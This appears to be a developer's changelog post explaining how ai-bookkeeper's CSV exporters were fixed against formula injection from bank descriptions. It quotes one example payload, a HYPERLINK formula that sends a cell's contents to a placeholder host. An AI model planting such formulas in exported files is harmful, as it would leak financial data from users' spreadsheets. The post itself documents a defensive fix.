---
title: "A bank description can be a spreadsheet formula"
date: 2026-10-24
description: "ai-bookkeeper's CSV exports copied bank text verbatim, so a description starting with = + - or @ ran as a formula in Excel or Sheets. Now it doesn't."
tags: [ai-bookkeeper, security, csv, bookkeeping]
---

A bookkeeping tool imports text it does not control: the description on each
bank line is whatever the merchant, or anyone who can send you money, chose to
write. ai-bookkeeper then exports that text in CSV for QuickBooks, Xero, a
preparer or a spreadsheet. If a description begins with `=`, `+`, `-` or `@`,
Excel and Google Sheets treat the cell as a formula, which is the long-known
"CSV injection" problem.

Checking the exporters (`exportJournal` in the `csv`, `qbo` and `xero` formats,
and `exportLines`) showed they quoted commas and newlines but nothing else. A
Venmo note of `=HYPERLINK("http://example/?x="&A1,"Click")` would have landed
in the memo column as a live formula.

The fix puts a leading apostrophe on text columns (memo, narration, account
name, description, reason) that start with one of those characters or a tab or
carriage return. Amount, date and code columns are untouched, so a `-12.50`
stays a number. The new `export-formula-safety.test.mjs` fails without the
change and passes with it; the whole ai-bookkeeper suite (828 tests) passes.

Not covered: the IIF, ledger and beancount outputs are not spreadsheet
formats, so they were left alone.
